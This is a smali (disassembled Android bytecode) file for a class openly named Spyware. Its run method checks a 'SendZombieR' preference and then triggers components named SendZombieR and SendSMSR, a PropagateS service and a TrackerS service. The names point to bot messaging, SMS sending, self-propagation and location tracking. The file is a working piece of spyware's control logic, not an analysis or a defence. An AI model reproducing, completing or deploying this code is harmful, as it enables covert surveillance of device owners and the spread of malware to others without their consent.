.class public Landroid/spyware/Spyware;
.super Ljava/lang/Object;
.source "Spyware.java"


# static fields
.field public static final DEV_MODE:Z = true

.field public static final TAG:Ljava/lang/String; = "::trace"

.field public static final TIMER:I = 0x5


# instance fields
.field private context:Landroid/content/Context;

.field private prefs:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .registers 3
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 20
    iput-object p1, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    .line 21
    invoke-static {p1}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Landroid/spyware/Spyware;->prefs:Landroid/content/SharedPreferences;

    .line 22
    return-void
.end method


# virtual methods
.method public run()V
    .registers 5

    .prologue
    .line 26
    iget-object v0, p0, Landroid/spyware/Spyware;->prefs:Landroid/content/SharedPreferences;

    const-string v1, "SendZombieR"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_19

    .line 27
    iget-object v0, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v3, Landroid/spyware/SendZombieR;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 30
    :cond_19
    iget-object v0, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v3, Landroid/spyware/SendSMSR;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 33
    iget-object v0, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v3, Landroid/spyware/PropagateS;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 34
    iget-object v0, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v3, Landroid/spyware/TrackerS;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 35
    return-void
.end method
